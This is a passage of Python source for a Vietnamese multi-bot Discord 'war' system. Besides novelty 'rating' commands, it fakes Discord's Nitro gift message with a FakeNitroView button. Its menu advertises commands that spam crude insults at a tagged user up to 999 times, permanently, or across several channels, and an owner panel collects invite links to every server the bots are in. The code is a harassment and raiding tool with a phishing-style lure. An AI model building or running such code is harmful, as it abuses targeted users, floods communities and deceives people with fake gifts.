        title="🌸 MÁY ĐO ĐỘ WIBU OTAKU 🌸",
        description=(
            f"🎯 **Phân Tích Thằng Ngu:** {target.mention}\n\n# 🌀 **{tyle}% WIBU** 🌀"
        ),
        color=discord.Color.from_rgb(147, 112, 219),
    )
    embed.add_field(name="🏷️ Cấp Độ Otaku:", value=f"`{status}`", inline=False)
    embed.add_field(name="💖 Waifu Tối Thượng:", value=f"`{waifu}`", inline=True)
    embed.add_field(name="⏱️ Cày Anime:", value=f"`{anime_hours}`", inline=True)
    embed.add_field(
        name="💬 Câu Nói Bất Hủ:", value=f"> *\"{quote}\"*", inline=False
    )
    embed.set_thumbnail(url=target.display_avatar.url)
    embed.set_footer(
        text=f"Kiểm tra bởi {interaction.user.name} • EPR"
    )
    await interaction.followup.send(embed=embed)

  @b_target.tree.command(
      name="nitro", description="Phát Nitro từ thiện cho lũ ngu (Miễn phí)"
  )
  async def nitro_slash(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    await interaction.followup.send(
        "✅ Đã phát quà Nitro thành công!", ephemeral=True
    )

    embed = discord.Embed(
        title="You've been gifted a subscription!",
        description=(
            f"**{interaction.user.name.lower()}** has gifted you Nitro for **1 month**\n\n*Expires 2 giờ tới*"
        ),
        color=discord.Color.from_rgb(43, 45, 49),
    )

    image_path = "nitro.webp"
    if os.path.exists(image_path):
      file_gui = discord.File(image_path, filename="nitro.webp")
      embed.set_thumbnail(url="attachment://nitro.webp")
      await interaction.channel.send(
          embed=embed, file=file_gui, view=FakeNitroView()
      )
    else:
      embed.set_thumbnail(url="https://i.imgur.com/3932824.png")
      await interaction.channel.send(embed=embed, view=FakeNitroView())

  @b_target.tree.command(name="raid", description="Tính năng độc quyền")
  async def raid_slash(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=False)
    await interaction.followup.send(
        f"# {interaction.user.mention} M ĐỊNH RAID À THẰNG NGU? 💀"
    )

  @b_target.tree.command(
      name="botinfo", description="Hiển thị bảng thống kê thông tin của bot"
  )
  async def botinfo_slash(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=False)
    total_servers = sum(len(b.guilds) for b in [bot1, bot2, bot3, bot4, bot5])
    total_users = get_total_users_count()
    embed = discord.Embed(
        title="📊 THÔNG TIN & THỐNG KÊ BOT",
        color=discord.Color.from_rgb(255, 0, 0),
    )
    embed.add_field(
        name="📈 Số liệu hệ thống",
        value=f"👤 **Tổng User đã dùng lệnh:** `{total_users}`\n🌍 **Tổng Server bot đang tham gia:** `{total_servers}`",
        inline=False,
    )
    embed.set_thumbnail(
        url="https://media.discordapp.net/attachments/1551512664788832367/1551968387721330739/chinagirl10.jpg?ex=6ab5e0f1&is=6ab48f71&hm=7fdfb150f0cff93e7d84db598c921de445d27cad3119b30be7644622ee1ca1a3&"
    )
    embed.set_footer(text="Bot by Becus • BotInfo")
    await interaction.followup.send(embed=embed)

  class MenuSelect(discord.ui.Select):

    def __init__(self):
      options = [
          discord.SelectOption(
              label="Free Commands",
              value="free",
              emoji="🌷",
              description="Xem các lệnh Free",
          ),
          discord.SelectOption(
              label="War Commands",
              value="war",
              emoji="💀",
              description="Xem các lệnh War",
          ),
          discord.SelectOption(
              label="Owner",
              value="owner",
              emoji="👑",
              description="Xem các lệnh Owner",
          ),
      ]
      super().__init__(
          placeholder="Bấm Vào Đây",
          min_values=1,
          max_values=1,
          options=options,
      )

    async def callback(self, interaction: discord.Interaction):
      category = self.values[0]
      banner_url = "https://cdn.discordapp.com/attachments/1314235716674388068/1516663977134784624/RGB-line.gif?ex=6ab206e6&is=6ab0b566&hm=39a78584e9c972d5c8cf58e682324bf1dec6d968b02f515cf78e6e185993a898&"
      thumbnail_url = "https://media.discordapp.net/attachments/1551512664788832367/1551968387721330739/chinagirl10.jpg?ex=6ab5e0f1&is=6ab48f71&hm=7fdfb150f0cff93e7d84db598c921de445d27cad3119b30be7644622ee1ca1a3&"

      if category == "free":
        embed = discord.Embed(
            title="🌷 FREE COMMANDS", color=discord.Color.from_rgb(255, 0, 0)
        )
        embed.add_field(
            name="Lệnh Free",
            value=(
                "❤️**`/femboy`**\n"
                "➱ Đo lường chỉ số Femboy\n\n"

                "🌸**`/cute`**\n"
                "➱ Đo chỉ số Cute\n\n"

                "🍑**`/dam`**\n"
                "➱ Đo độ dâm đãng\n\n"

                "🤓**`/wibu`**\n"
                "➱ Phân tích mức độ nghiện Anime\n\n"


                "💵**`/chuyentien`**\n"
                "➱ Chuyển khoản ngân hàng trực tuyến\n\n"

                "🎁**`/nitro`**\n"
                "➱ Phát Nitro miễn phí siêu cấp bá khí\n\n"

                "💥**`/raid`**\n"
                "➱ Sài thử đi rồi biết:))\n\n"

                "📊**`/botinfo`**\n"
                "➱ Xem thông tin và thống kê bot"
            ),
            inline=False,
        )
      elif category == "war":
        embed = discord.Embed(
            title="👹 WAR COMMANDS", color=discord.Color.from_rgb(255, 0, 0)
        )
        embed.add_field(
            name="Lệnh War",
            value=(
                "💬**`/say`**\n"
                "<a:arrow2:1554884049531834519> Mượn bot gửi tin nhắn\n\n"

                "🗯️**`b!noidung nội_dung số_lượng`**\n"
                "<a:arrow2:1554884049531834519> Xả nội dung tùy chỉnh tối đa 999 lần <a:cross:1554034613859389551>\n\n"

                "<a:lickL:1554884178024333482>**`b!xangon @user/ID số_lượng`**\n"
                "<a:arrow2:1554884049531834519> Xả ngôn vào thằng ngu lồn V1 tối đa 999 <a:cross:1554034613859389551>\n\n"

                "<a:lickL:1554884178024333482>**`b!xangonV2 @user/ID số_lượng`**\n"
                "<a:arrow2:1554884049531834519> Xả ngôn vào thằng ngu lồn V2 tối đa 999 <a:cross:1554034613859389551>\n\n"

                "<a:lickL:1554884178024333482>**`b!xangonV3 @user/ID`**\n"
                "<a:arrow2:1554884049531834519> Xả ngôn vĩnh viễn lên thằng ngu lồn <a:cross:1554034613859389551>\n\n"

                "<a:lickL:1554884178024333482>**`/treodakenh`**\n"
                "<a:arrow2:1554884049531834519> Xả ngôn đa kênh lên thằng ngu lồn <a:cross:1554034613859389551>\n\n"

                "<a:c_:1554838191926939679>**`b!stop`** hoặc **`/stop`**\n"
                "<a:arrow2:1554884049531834519> Dừng all tiến trình spam/treo trong server"
            ),
            inline=False,
        )
      else:
        embed = discord.Embed(
            title="🤪 OWNER", color=discord.Color.from_rgb(255, 0, 0)
        )
        embed.add_field(
            name="Lệnh Quản Lý",
            value=(
                "⚫**`/blacklist`**\n"
                "➱ Xem danh sách Blacklist\n\n"

                "✅**`/blacklistadd`**\n"
                "➱ Thêm user vào Blacklist\n\n"

                "⛔**`/blacklistremove`**\n"
                "➱ Xóa user khỏi Blacklist\n\n"

                "🚪**`/outserver`**\n"
                "➱ Chọn bot và server để out\n\n"

                "🔗**`/linkserver`**\n"
                "➱ Liệt kê tên toàn bộ server của bot đang hoạt động"
            ),
            inline=False,
        )

      embed.set_image(url=banner_url)
      embed.set_footer(text="bot by becus")
      embed.timestamp = discord.utils.utcnow()
      if category == "war":
        embed.set_thumbnail(url=thumbnail_url)

      await interaction.response.edit_message(embed=embed, view=MenuView())

  class MenuLinkButton(discord.ui.Button):

    def __init__(self):
      super().__init__(
          label="Vào Đây Để Add Bot",
          emoji="🪦",
          style=discord.ButtonStyle.link,
          url="https://discord.gg/zvdH9ZtBp2",
      )

  class MenuView(discord.ui.View):

    def __init__(self):
      super().__init__(timeout=300)
      self.add_item(MenuSelect())
      self.add_item(MenuLinkButton())

  @b_target.tree.command(
      name="menu", description="Hiển thị bảng hướng dẫn sử dụng bot"
  )
  async def menu_slash(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=False)
    embed = discord.Embed(
        title="<a:blcrown:1554034899227250749> EMPEROR | EPR",
        description=(
            "<:shhh:1554028014818295838>**Vào Server Để Add Bot - Bot Được Tạo Bởi Gehihi**😂"
        ),
        color=discord.Color.from_rgb(255, 0, 0),
    )
    embed.set_image(
        url=(
            "https://cdn.discordapp.com/attachments/1551512664788832367/1554492022939713566/86e220e1f2c14c31ec141aa465cb5b9a.gif?ex=6abd1503&is=6abbc383&hm=3d8681726d36c69d7e0f6e776a60dfce4841a13162f3fe481307172c0c5d5449&"
        )
    )
    embed.timestamp = discord.utils.utcnow()
    embed.set_thumbnail(
        url="https://media.discordapp.net/attachments/1551512664788832367/1551968387721330739/chinagirl10.jpg?ex=6ab5e0f1&is=6ab48f71&hm=7fdfb150f0cff93e7d84db598c921de445d27cad3119b30be7644622ee1ca1a3&"
    )

    await interaction.followup.send(embed=embed, view=MenuView())
class PaginationView(discord.ui.View):

  def __init__(self, data_list, title, b_target):
    super().__init__(timeout=180)
    self.data_list = data_list
    self.title = title
    self.b_target = b_target
    self.current_page = 0
    self.per_page = 5
    self.max_pages = max(1, math.ceil(len(data_list) / self.per_page))
    self.update_buttons()

  def update_buttons(self):
    self.prev_button.disabled = self.current_page == 0
    self.next_button.disabled = self.current_page >= self.max_pages - 1

  def get_embed(self):
    embed = discord.Embed(title=self.title, color=discord.Color.blue())
    if not self.data_list:
      embed.description = "Danh sách đang trống."
      return embed

    start = self.current_page * self.per_page
    end = start + self.per_page
    page_items = self.data_list[start:end]

    desc_lines = []
    for idx, uid in enumerate(page_items, start + 1):
      desc_lines.append(f"**{idx}.** <@{uid}>\nID: `{uid}`")
    embed.description = "\n".join(desc_lines)
    embed.set_footer(text=f"Trang {self.current_page + 1}/{self.max_pages}")
    return embed

  @discord.ui.button(label="⬅️", style=discord.ButtonStyle.primary)
  async def prev_button(self, interaction: discord.Interaction, button: discord.ui.Button):
    if self.current_page > 0:
      self.current_page -= 1
      self.update_buttons()
      await interaction.response.edit_message(embed=self.get_embed(), view=self)

  @discord.ui.button(label="➡️", style=discord.ButtonStyle.primary)
  async def next_button(self, interaction: discord.Interaction, button: discord.ui.Button):
    if self.current_page < self.max_pages - 1:
      self.current_page += 1
      self.update_buttons()
      await interaction.response.edit_message(embed=self.get_embed(), view=self)



class OutServerView(discord.ui.View):
  """Owner-only panel for selecting active bots and a guild to leave."""

  def __init__(self, owner_id: int):
    super().__init__(timeout=300)
    self.owner_id = int(owner_id)
    self.selected_bot_indexes = []
    self.selected_guild_id = None
    self.server_page = 0
    self.server_guilds = []

    self.bot_select = discord.ui.Select(
        placeholder="Chọn bot sẽ out...",
        min_values=1,
        max_values=5,
        options=self._build_bot_options(),
        custom_id="outserver_bot_select",
    )
    self.bot_select.callback = self.bot_callback
    self.add_item(self.bot_select)

    self.server_select = discord.ui.Select(
        placeholder="Chọn server để out...",
        min_values=1,
        max_values=1,
        options=[
            discord.SelectOption(
                label="Chọn Bot trước",
                value="none",
                description="Hãy chọn ít nhất một bot ở ô phía trên.",
            )
        ],
        custom_id="outserver_server_select",
    )
    self.server_select.callback = self.server_callback
    self.server_select.disabled = True
    self.add_item(self.server_select)

  def _all_bots(self):
    return [bot1, bot2, bot3, bot4, bot5]

  def _active_bots(self):
    return [b for b in self._all_bots() if not b.is_closed() and b.user is not None]

  def _build_bot_options(self):
    active = self._active_bots()
    if not active:
      return [
          discord.SelectOption(
              label="Không có bot đang hoạt động",
              value="none",
              description="Không thể tìm thấy bot đang kết nối.",
          )
      ]

    options = []
    for index, bot in enumerate(self._all_bots()):
      if bot not in active:
        continue
      name = bot.user.name if bot.user else f"Bot {index + 1}"
      guild_count = len(bot.guilds)
      label = f"Bot {index + 1} • {name}"[:100]
      options.append(
          discord.SelectOption(
              label=label,
              value=str(index),
              description=f"Đang ở {guild_count} server"[:100],
          )
      )
    return options[:25]

  def _selected_bots(self):
    bots = self._all_bots()
    return [bots[i] for i in self.selected_bot_indexes if 0 <= i < len(bots)]

  def _refresh_server_guilds(self):
    selected = self._selected_bots()
    if selected:
      guild_map = {guild.id: guild for guild in selected[0].guilds}
      for bot in selected[1:]:
        guild_ids = {guild.id for guild in bot.guilds}
        guild_map = {gid: guild for gid, guild in guild_map.items() if gid in guild_ids}
    else:
      guild_map = {}

    self.server_guilds = sorted(
        guild_map.values(),
        key=lambda g: (g.name.lower(), g.id),
    )
    self.server_page = min(
        self.server_page,
        max(0, (len(self.server_guilds) - 1) // 25),
    )
    if self.selected_guild_id not in {g.id for g in self.server_guilds}:
      self.selected_guild_id = None

    start = self.server_page * 25
    page_guilds = self.server_guilds[start:start + 25]

    if page_guilds:
      options = []
      for guild in page_guilds:
        member_count = sum(
            1 for bot in selected if bot.get_guild(guild.id) is not None
        )
        options.append(
            discord.SelectOption(
                label=guild.name[:100],
                value=str(guild.id),
                description=f"{member_count} bot đã chọn đang ở server này"[:100],
                emoji="🏠",
                default=(guild.id == self.selected_guild_id),
            )
        )
      self.server_select.options = options
      self.server_select.disabled = False
      self.server_select.placeholder = (
          f"Chọn server để out • Trang {self.server_page + 1}/"
          f"{max(1, math.ceil(len(self.server_guilds) / 25))}"
      )
    else:
      self.server_select.options = [
          discord.SelectOption(
              label="Không có server",
              value="none",
              description="Bot đã chọn không đang ở server nào chung.",
          )
      ]
      self.server_select.disabled = True
      self.server_select.placeholder = "Chọn server để out..."

    self._sync_page_buttons()

  def _sync_page_buttons(self):
    total_pages = max(1, math.ceil(len(self.server_guilds) / 25))
    for item in self.children:
      if not isinstance(item, discord.ui.Button):
        continue
      if item.custom_id == "outserver_prev":
        item.disabled = self.server_page <= 0
      elif item.custom_id == "outserver_next":
        item.disabled = self.server_page >= total_pages - 1

  def get_embed(self, status_text=None):
    selected_bots = self._selected_bots()
    bot_text = ", ".join(
        f"Bot {i + 1}" for i in self.selected_bot_indexes
    ) or "Chưa chọn"

    server = next(
        (g for g in self.server_guilds if g.id == self.selected_guild_id),
        None,
    )
    server_text = (
        f"**{server.name}**\nID: `{server.id}`" if server else "Chưa chọn"
    )

    description = (
        "Chọn **Bot** ở ô đầu tiên, sau đó chọn **Server** ở ô thứ hai.\n"
        "Bấm **Start** để các bot đã chọn rời server đã chọn.\n\n"
        f"🤖 **Bot đã chọn:** {bot_text}\n"
        f"🏠 **Server đã chọn:** {server_text}"
    )
    if status_text:
      description += f"\n\n{status_text}"

    embed = discord.Embed(
        title="🚪 OUT SERVER – BẢNG ĐIỀU KHIỂN",
        description=description,
        color=discord.Color.red(),
    )
    embed.set_footer(text="Chỉ Owner được sử dụng bảng điều khiển này")
    embed.timestamp = discord.utils.utcnow()
    return embed

  async def interaction_check(self, interaction: discord.Interaction):
    if interaction.user.id != self.owner_id:
      if not interaction.response.is_done():
        await interaction.response.defer(ephemeral=True)
      return False
    return True

  async def bot_callback(self, interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    values = self.bot_select.values
    self.selected_bot_indexes = []
    for value in values:
      try:
        index = int(value)
      except (TypeError, ValueError):
        continue
      if 0 <= index < 5:
        self.selected_bot_indexes.append(index)

    self.selected_guild_id = None
    self.server_page = 0
    self._refresh_server_guilds()
    await interaction.edit_original_response(embed=self.get_embed(), view=self)

  async def server_callback(self, interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    try:
      self.selected_guild_id = int(self.server_select.values[0])
    except (IndexError, TypeError, ValueError):
      self.selected_guild_id = None
    await interaction.edit_original_response(embed=self.get_embed(), view=self)

  @discord.ui.button(
      label="⬅️",
      style=discord.ButtonStyle.secondary,
      custom_id="outserver_prev",
  )
  async def prev_page(self, interaction: discord.Interaction, button: discord.ui.Button):
    await interaction.response.defer(ephemeral=True)
    if self.server_page > 0:
      self.server_page -= 1
      self._refresh_server_guilds()
    await interaction.edit_original_response(embed=self.get_embed(), view=self)

  @discord.ui.button(
      label="➡️",
      style=discord.ButtonStyle.secondary,
      custom_id="outserver_next",
  )
  async def next_page(self, interaction: discord.Interaction, button: discord.ui.Button):
    await interaction.response.defer(ephemeral=True)
    total_pages = max(1, math.ceil(len(self.server_guilds) / 25))
    if self.server_page < total_pages - 1:
      self.server_page += 1
      self._refresh_server_guilds()
    await interaction.edit_original_response(embed=self.get_embed(), view=self)

  @discord.ui.button(
      label="Start",
      style=discord.ButtonStyle.success,
      custom_id="outserver_start",
  )
  async def start_out(self, interaction: discord.Interaction, button: discord.ui.Button):
    # Acknowledge immediately so the interaction does not time out while bots leave.
    await interaction.response.defer(ephemeral=True)

    selected_bots = self._selected_bots()
    if not selected_bots:
      await interaction.edit_original_response(
          embed=self.get_embed("⚠️ Chưa chọn bot nào."),
          view=self,
      )
      return

    if self.selected_guild_id is None:
      await interaction.edit_original_response(
          embed=self.get_embed("⚠️ Chưa chọn server nào."),
          view=self,
      )
      return

    server = next(
        (g for g in self.server_guilds if g.id == self.selected_guild_id),
        None,
    )
    if server is None:
      self._refresh_server_guilds()
      await interaction.edit_original_response(
          embed=self.get_embed("⚠️ Server đã chọn không còn khả dụng hoặc bot không còn ở đó."),
          view=self,
      )
      return

    await interaction.edit_original_response(
        embed=self.get_embed(
            f"⏳ Đang xử lý... Sẽ cho {len(selected_bots)} bot rời server đã chọn."
        ),
        view=None,
    )

    success = []
    skipped = []
    failed = []

    # Leave sequentially with a small pause so each bot has time to finish its request.
    for index, bot in zip(self.selected_bot_indexes, selected_bots):
      bot_guild = bot.get_guild(self.selected_guild_id)
      bot_label = f"Bot {index + 1}"
      if bot_guild is None:
        skipped.append(bot_label)
        continue

      try:
        await asyncio.wait_for(bot_guild.leave(), timeout=15)
        success.append(bot_label)
      except asyncio.TimeoutError:
        failed.append(f"{bot_label} (timeout)")
      except (discord.Forbidden, discord.HTTPException, OSError, asyncio.TimeoutError) as exc:
        failed.append(f"{bot_label} ({type(exc).__name__})")
      except Exception as exc:
        failed.append(f"{bot_label} ({type(exc).__name__})")

      await asyncio.sleep(0.8)

    summary_parts = [
        f"🏠 Server: **{server.name}**",
        f"✅ Đã out: `{len(success)}` bot" + (f" ({', '.join(success)})" if success else ""),
        f"⚠️ Không ở server: `{len(skipped)}` bot" + (f" ({', '.join(skipped)})" if skipped else ""),
        f"❌ Lỗi: `{len(failed)}` bot" + (f" ({', '.join(failed)})" if failed else ""),
    ]
    result_embed = discord.Embed(
        title="🚪 OUT SERVER – KẾT QUẢ",
        description="\n".join(summary_parts),
        color=discord.Color.green() if not failed else discord.Color.orange(),
    )
    result_embed.timestamp = discord.utils.utcnow()
    result_embed.set_footer(text="OutServer • Owner Control")

    try:
      await interaction.edit_original_response(embed=result_embed, view=None)
    except Exception:
      try:
        await interaction.followup.send(embed=result_embed, ephemeral=True)
      except Exception:
        pass

  @discord.ui.button(
      label="Hủy",
      style=discord.ButtonStyle.danger,
      custom_id="outserver_cancel",
  )
  async def cancel_out(self, interaction: discord.Interaction, button: discord.ui.Button):
    await interaction.response.defer(ephemeral=True)
    await interaction.edit_original_response(
        embed=discord.Embed(
            title="🚪 OUT SERVER – ĐÃ HỦY",
            description="Không có bot nào được cho rời server.",
            color=discord.Color.dark_gray(),
        ),
        view=None,
    )

class LinkServerView(discord.ui.View):

  def __init__(self, entries, owner_id):
    super().__init__(timeout=300)
    self.entries = entries
    self.owner_id = owner_id
    self.current_page = 0
    self.per_page = 8
    self.max_pages = max(1, math.ceil(len(entries) / self.per_page))
    self._sync_buttons()

  def _sync_buttons(self):
    self.prev_button.disabled = self.current_page <= 0
    self.next_button.disabled = self.current_page >= self.max_pages - 1

  def get_embed(self):
    embed = discord.Embed(
        title="🔗 DANH SÁCH LINK SERVER CỦA CÁC BOT",
        color=discord.Color.red(),
    )

    if not self.entries:
      embed.description = "Không tìm thấy server nào mà các bot đang tham gia."
      embed.set_footer(text="Owner Control")
      return embed

    start = self.current_page * self.per_page
    end = start + self.per_page
    page_items = self.entries[start:end]

    lines = []
    for idx, item in enumerate(page_items, start + 1):
      bot_text = ", ".join(item["bots"])
      invite = item["invite"] or "Không tạo được link mời"
      lines.append(
          f"**{idx}. {item['name']}**\n"
          f"🤖 {bot_text}\n"
          f"🔗 {invite}"
      )

    embed.description = "\n\n".join(lines)
    embed.set_footer(text=f"Trang {self.current_page + 1}/{self.max_pages} • Chỉ Owner")
    return embed

  async def interaction_check(self, interaction: discord.Interaction):
    if interaction.user.id != self.owner_id:
      if not interaction.response.is_done():
        await interaction.response.defer(ephemeral=True)
      return False
    return True

  @discord.ui.button(label="⬅️", style=discord.ButtonStyle.secondary)
  async def prev_button(self, interaction: discord.Interaction, button: discord.ui.Button):
    await interaction.response.defer(ephemeral=True)
    if self.current_page > 0:
      self.current_page -= 1
      self._sync_buttons()
    await interaction.edit_original_response(embed=self.get_embed(), view=self)

  @discord.ui.button(label="➡️", style=discord.ButtonStyle.secondary)
  async def next_button(self, interaction: discord.Interaction, button: discord.ui.Button):
    await interaction.response.defer(ephemeral=True)
    if self.current_page < self.max_pages - 1:
      self.current_page += 1
      self._sync_buttons()
    await interaction.edit_original_response(embed=self.get_embed(), view=self)


async def _collect_linkserver_entries():
  bots = [bot1, bot2, bot3, bot4, bot5]
  grouped = {}

  for index, bot in enumerate(bots, 1):
    for guild in bot.guilds:
      item = grouped.setdefault(
          guild.id,
          {
              "name": guild.name,
              "bots": [],
              "guild": guild,
              "bot": bot,
          },
      )
      bot_label = f"Bot {index}"
      if bot_label not in item["bots"]:
        item["bots"].append(bot_label)

  entries = []
  for item in sorted(grouped.values(), key=lambda x: x["name"].lower()):
    guild = item["guild"]
    invite_link = None

    try:
      invite_link = guild.vanity_url
    except Exception:
      invite_link = None

    if not invite_link:
      me = guild.me
      if me is not None:
        for channel in guild.text_channels:
          try:
            if channel.permissions_for(me).create_instant_invite:
              invite = await channel.create_invite(
                  max_age=3600,
                  max_uses=0,
                  reason="Owner /linkserver",
              )
              invite_link = invite.url
              break
          except (discord.Forbidden, discord.HTTPException):
            continue
          except Exception:
            continue

    entries.append(
        {
            "name": guild.name,
            "bots": item["bots"],
            "invite": invite_link,
        }
    )

  return entries


def register_admin_commands(b_target):

  @b_target.tree.command(
      name="linkserver",
      description="Liệt kê tên và link mời của toàn bộ server các bot đang ở (Owner)",
  )
  async def linkserver_slash(interaction: discord.Interaction):
    if not check_owner(interaction.user.id):
      await interaction.response.defer(ephemeral=True)
      return

    await interaction.response.defer(ephemeral=True)
    entries = await _collect_linkserver_entries()
    view = LinkServerView(entries, interaction.user.id)
    await interaction.followup.send(embed=view.get_embed(), view=view, ephemeral=True)

  @b_target.tree.command(
      name="outserver",
      description="Chọn bot và server để các bot đã chọn rời server (Owner)",
  )
  async def outserver_slash(interaction: discord.Interaction):
    if not check_owner(interaction.user.id):
      # Acknowledge silently so non-owners see no public message.
      await interaction.response.defer(ephemeral=True)
      return

    await interaction.response.defer(ephemeral=False)
    view = OutServerView(interaction.user.id)
    embed = view.get_embed()
    await interaction.followup.send(embed=embed, view=view, ephemeral=False)

  @b_target.tree.command(
      name="say", description="Mượn bot nói"
  )
  @app_commands.describe(noi_dung="Nhập nội dung")
  async def say_slash(interaction: discord.Interaction, noi_dung: str):
    if not check_admin(interaction.user):
      await interaction.response.defer(ephemeral=True)
      return
    await interaction.response.defer(ephemeral=True)
    await interaction.followup.send("✅ Đã gửi tin nhắn!", ephemeral=True)
    await interaction.channel.send(noi_dung)

  @b_target.tree.command(
      name="treodakenh",
      description="Treo spam đa kênh",
  )
  async def treodakenh_slash(interaction: discord.Interaction):
    if not check_admin(interaction.user):
      await interaction.response.defer(ephemeral=True)
      return
    await interaction.response.defer(ephemeral=False)

    view = TreoChannelSelectView(b_target)
    embed = discord.Embed(
        title="🚬 BẢNG ĐIỀU KHIỂN TREO ĐA KÊNH",
        description="Chọn kênh và user bên dưới rồi bấm **Start** để xả ngôn, muốn dừng thì sài lệnh `b!stop` cho nhanh.",
        color=discord.Color.red(),
    )
    embed.set_image(
        url="https://cdn.discordapp.com/attachments/1551512664788832367/1552579203419873370/file_00000000ef788209a4bee654e029994c.png?ex=6ab61f8f&is=6ab4ce0f&hm=21e3b103d77daaea574567080a7b6834ed912dd5083bb4d583f692fdad6c9e15&"
    )
    embed.set_footer(text="Treo Đa Kênh Siêu Bá Khí")
    await interaction.followup.send(embed=embed, view=view, ephemeral=False)

  @b_target.tree.command(
      name="stop",
      description="Dừng toàn bộ tiến trình spam/treo trong server",
  )
  async def stop_slash(interaction: discord.Interaction):
    if not check_admin(interaction.user):
      await interaction.response.defer(ephemeral=True)
      return
    await interaction.response.defer(ephemeral=True)

    guild_id = interaction.guild.id
    stopped_count = await _cancel_guild_tasks(guild_id)

    if stopped_count > 0:
      await interaction.followup.send(
          "🛑 **Đã dừng tất cả các tiến trình spam/treo trong server này!**", ephemeral=True
      )
    else:
      await interaction.followup.send(
          "⚠️ Không có tiến trình nào đang chạy trong server này", ephemeral=True
      )

  @b_target.tree.command(
      name="blacklist", description="Xem danh sách Blacklist (Chỉ Owner)"
  )
  async def blacklist_slash(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=False)
    if not check_owner(interaction.user.id):
      await interaction.followup.send(
          "❌ Lệnh này chỉ dành riêng cho (Owner)!", ephemeral=False
      )
      return

    data = load_access_control()
    bl = data.get("blacklist", [])
    view = PaginationView(bl, "📋 DANH SÁCH BLACKLIST", b_target)
    await interaction.followup.send(embed=view.get_embed(), view=view, ephemeral=True)

  @b_target.tree.command(
      name="blacklistadd",
      description="Thêm user vào Blacklist bằng ID hoặc tag (Chỉ Owner)",
  )
  @app_commands.describe(user_input="Nhập ID hoặc tag (@) của user cần chặn")
  async def blacklistadd_slash(
      interaction: discord.Interaction, user_input: str
  ):
    await interaction.response.defer(ephemeral=False)
    if not check_owner(interaction.user.id):
      await interaction.followup.send(
          "❌ Lệnh này chỉ dành riêng cho (Owner)!", ephemeral=False
      )
      return

    match = re.search(r"\d+", user_input)
    if not match:
      await interaction.followup.send(
          "❌ Không tìm thấy ID hợp lệ trong thông tin bạn nhập!", ephemeral=False
      )
      return

    target_id = int(match.group())
    data = load_access_control()
    if target_id not in data["blacklist"] and str(target_id) not in [
        str(x) for x in data["blacklist"]
    ]:
      data["blacklist"].append(target_id)
      save_access_control(data)
      await interaction.followup.send(
          f"✅ Đã thêm <@{target_id}> vào **Blacklist**!", ephemeral=False
      )
    else:
      await interaction.followup.send(
          f"⚠️ <@{target_id}> đã có sẵn trong Blacklist rồi!", ephemeral=False
      )

  @b_target.tree.command(
      name="blacklistremove",
      description="Xóa user khỏi Blacklist bằng ID hoặc tag (Chỉ Owner)",
  )
  @app_commands.describe(user_input="Nhập ID hoặc tag (@) của user cần bỏ chặn")
  async def blacklistremove_slash(
      interaction: discord.Interaction, user_input: str
  ):
    await interaction.response.defer(ephemeral=False)
    if not check_owner(interaction.user.id):
      await interaction.followup.send(
          "❌ Lệnh này chỉ dành riêng cho (Owner)!", ephemeral=False
      )
      return

    match = re.search(r"\d+", user_input)
    if not match:
      await interaction.followup.send(
          "❌ Không tìm thấy ID hợp lệ trong thông tin bạn nhập!", ephemeral=False
      )
      return

    target_id = int(match.group())
    data = load_access_control()
    data["blacklist"] = [
        x for x in data["blacklist"] if str(x) != str(target_id)
    ]
    save_access_control(data)
    await interaction.followup.send(
        f"✅ Đã xóa <@{target_id}> khỏi **Blacklist**!", ephemeral=False
    )


register_all_commands(bot1)
register_all_commands(bot2)
register_all_commands(bot3)
register_all_commands(bot4)
register_all_commands(bot5)

register_admin_commands(bot1)
register_admin_commands(bot2)
register_admin_commands(bot3)
register_admin_commands(bot4)
register_admin_commands(bot5)


async def main():
  token1 = os.getenv("TOKEN1")
  token2 = os.getenv("TOKEN2")
  token3 = os.getenv("TOKEN3")
  token4 = os.getenv("TOKEN4")
  token5 = os.getenv("TOKEN5")

  setup_bot_events(bot1, "Bot 1")
  setup_bot_events(bot2, "Bot 2")
  setup_bot_events(bot3, "Bot 3")
  setup_bot_events(bot4, "Bot 4")
  setup_bot_events(bot5, "Bot 5")

  await asyncio.gather(
      bot1.start(token1),
      bot2.start(token2),
      bot3.start(token3),
      bot4.start(token4),
      bot5.start(token5),
  )


if __name__ == "__main__":
  asyncio.run(main())
